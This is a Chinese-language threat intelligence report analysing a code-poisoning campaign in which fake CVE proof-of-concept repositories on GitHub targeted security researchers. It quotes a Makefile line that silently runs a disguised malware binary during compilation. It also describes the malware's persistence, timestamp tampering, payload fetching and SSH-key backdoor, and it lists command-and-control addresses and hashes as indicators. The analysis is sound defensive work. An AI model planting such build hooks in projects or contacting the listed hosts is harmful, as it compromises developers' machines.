![](https://image.3001.net/images/20230713/1689243933_64afd11dcc589b8dd5c3f.jpg!small)

## 背景

近期绿盟科技天元实验室的研究员监测到一起针对漏洞研究者与红队人员的代码投毒攻击。攻击者以Linux与Vmware的两个今年的高可利用漏洞为掩护，在其控制的多个代码仓库中植入恶意程序。一旦用户下载代码并在本地编译，便会执行编译脚本中包含的恶意代码，使黑客获取主机控制权限。

![](https://image.3001.net/images/20230713/1689243102_64afcdde9456586dd604f.png!small)图
被植入恶意代码的漏洞POC仓库1 Linux内核权限提升漏洞  

![](https://image.3001.net/images/20230713/1689243126_64afcdf6e41c090b62cb0.png!small)图
被植入恶意代码的漏洞POC仓库2 VMware权限提升漏洞  

从提交记录可以发现，攻击者在2023年6月底开始分多次上传相关恶意代码。  

![](https://image.3001.net/images/20230713/1689243154_64afce126d0678adeab8a.png!small)恶意代码上传两天后攻击意图即暴露，repo使用者在issuse中提出了虚假POC与恶意代码埋藏的指控。  

![](https://image.3001.net/images/20230713/1689243171_64afce2328ed2974a4336.png!small)图
issuse中揭露虚假POC及恶意行为  

## 技战法分析

![](https://image.3001.net/images/20230713/1689243212_64afce4cba3e7010e4106.png!small)  

## 进行了伪装的编译配置文件投毒

从供应链的角度分析，攻击者采用了代码投毒的手法，在代码编译的过程中实施攻击。区别于直接将二  
进制payload直接托管于仓库中的常见“直勾钓鱼”的方式，将恶意代码埋藏与编译配置文件中无疑更具隐  
蔽性。

    
    
    CFLAGS= -I./inc
    LDFLAGS= -pthread -static
    
    all: obj $(TARGET) get_root
    
    $(TARGET): $(OBJECTS)
    	$(CC) $(LDFLAGS) -o $@ $^
    	strip $@
    	./src/aclocal.m4 <--执行仓库中包含的恶意程序

Makefile编译配置文件中包含了编译生成二进制所需执行的命令，攻击者在正常编译流程中插入了执行src目录中aclocal.m4文件的过程。该文件实际是另外一个编译系统automake中默认包含的配置文件，进行重命名伪装以欺骗受害者。aclocal.m4文件本身为针对Linux系统的恶意程序，一旦用户执行make命令编译项目就会被执行。

    
    
    aclocal.m4: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9fc8befaa32a1a88133dd077db0369576313e6d2, for GNU/Linux 3.2.0, stripped

## 自带防御规避特性的多阶段的恶意样本kworker

首次执行时复制自身到HOME目录、修改文件时间戳降低样本可疑度，并添加持久化。

![](https://image.3001.net/images/20230713/1689243301_64afcea5edf2c38e44f6c.png!small)![](https://image.3001.net/images/20230713/1689243408_64afcf1007346505ee06e.png!small)持久化方式：bashrc配置修改  

![](https://image.3001.net/images/20230713/1689243463_64afcf4708730fc70fe30.png!small)防御规避特性：时间戳修改  

随后，攻击者从硬编码的域名URL拉取下一阶段载荷并解密执行。  

![](https://image.3001.net/images/20230713/1689243512_64afcf78664f84311f5a4.png!small)测试过程中发现当以错误的方式请求时，攻击者服务器返回空内容，并拉黑请求IP。  

![](https://image.3001.net/images/20230713/1689243566_64afcfae7e412cd434347.png!small)  
请求到真实内容是一个bash脚本[1]，该bash脚本一方面收集信息并上传到公共存储库，随后回传存储库链接到服务器；另一方面通过SSH密钥添加实现持续控制。![](https://image.3001.net/images/20230713/1689243598_64afcfcedbda2796c0aa5.jpg!small)

绿盟科技威胁情报云（NTI）及绿盟一体化终端安全管理系统（UES）已支持对该事件涉及的基础设施相  
关情报的侦测和告警：

![](https://image.3001.net/images/20230713/1689243623_64afcfe7eb639974a7006.png!small)绿盟科技威胁情报云NTI情报成功命中  

![](https://image.3001.net/images/20230713/1689243661_64afd00d67b1c02c1186b.png!small)绿盟科技一体化终端安全管理系统UES成功捕获事件  

## 总结

近年来类似的利用漏洞EXP为诱饵，对漏洞研究者与红队人员发起的攻击的事件并不鲜见。但相比先前以恶意EXE文件为诱饵的手法，将恶意代码埋藏于编译配置文件中，在编译过程中触发恶意行为的利用链更为隐蔽。但这种触发方式也提高了被攻击者的门槛，需要对方具备漏洞EXP命令行编译能力无疑筛掉了一批习惯直接执行网络下载的漏洞利用程序的人员。实质上使这次攻击的目标向漏洞研究人员，或漏洞武器开发能力的红队人员偏移。

综合现有的情报，以及对攻击者基础设施的初步探测，我们判断本次代码投毒事件可能是酝酿已久的持续性攻击活动的一部分：选取一个关注量与Star量并不高的小项目先试水技战法可行性，收集必要的信息为后期攻击活动做准备。

## IOC情报

恶意投毒GitHub仓库地址：  
  
https://github.com/ChriSanders22/CVE-2023-20871-poc  
https://github.com/ChriSanders22/CVE-2023-35829-poc  
  
恶意样本kworker
SHA256：caa69b10b0bfca561dec90cbd1132b6dcb2c8a44d76a272a0b70b5c64776ff6c  
  
载荷投递、通讯C&C地址：  
  
http://cunniloss[.]accesscam[.]org/hash[.]php  
  
http://81[.]4[.]109[.]16  

## 参考链接

<https://twitter.com/xnand_/status/1676336329985077249>

## 关于我们

更多高级攻防对抗热点技术，欢迎关注公众号：M01N Team。

  

  

  

